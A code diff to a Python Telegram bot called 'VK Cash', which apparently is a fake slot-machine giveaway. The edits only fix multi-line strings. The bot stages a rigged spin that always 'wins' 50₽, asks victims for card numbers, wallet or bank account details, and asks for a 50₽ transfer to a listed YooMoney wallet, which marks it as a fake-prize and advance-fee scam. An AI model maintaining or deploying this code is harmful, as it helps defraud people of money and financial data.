@@ -58,8 +58,11 @@ def get_main_markup(user_id):
 
 @bot.message_handler(commands=['start'])
 def send_start(message):
-    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!
-Выбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))
+    bot.send_message(
+        message.chat.id,
+        "🎰 Добро пожаловать в VK Cash!\nВыбирай действие ниже:",
+        reply_markup=get_main_markup(message.from_user.id)
+    )
 
 @bot.callback_query_handler(func=lambda call: call.data == "free_spin")
 def handle_spin(call):
@@ -72,8 +75,7 @@ def handle_spin(call):
     elif uid in payment_pending:
         del payment_pending[uid]
     amount = 50
-    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...
-[ 🎰 🎰 🎰 ]")
+    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
     time.sleep(1)
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
     time.sleep(1)
@@ -82,13 +84,25 @@ def handle_spin(call):
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
     code = generate_code(amount, uid)
     user_states[uid] = {"amount": amount, "code": code}
-    bot.send_message(call.message.chat.id, f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта", parse_mode="Markdown")
+    bot.send_message(
+        call.message.chat.id,
+        f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n"
+        "— Номер карты (Сбербанк, Тинькофф)\n"
+        "— Или кошелёк (ЮMoney, Payeer, PayPal)\n"
+        "— Или банк + номер счёта",
+        parse_mode="Markdown"
+    )
 
 @bot.callback_query_handler(func=lambda call: call.data == "pay50")
 def handle_payment(call):
     uid = call.from_user.id
     payment_requested[uid] = True
-    bot.send_message(call.message.chat.id, "💸 Переведите 50₽ на ЮMoney: `4100119077541618`\nНазвание: *Плачу значит верчу*", parse_mode="Markdown", reply_markup=get_main_markup(uid))
+    bot.send_message(
+        call.message.chat.id,
+        "💸 Переведите 50₽ на ЮMoney: `4100119077541618`\nНазвание: *Плачу значит верчу*",
+        parse_mode="Markdown",
+        reply_markup=get_main_markup(uid)
+    )
 
 @bot.callback_query_handler(func=lambda call: call.data == "confirm_payment")
 def handle_confirm(call):
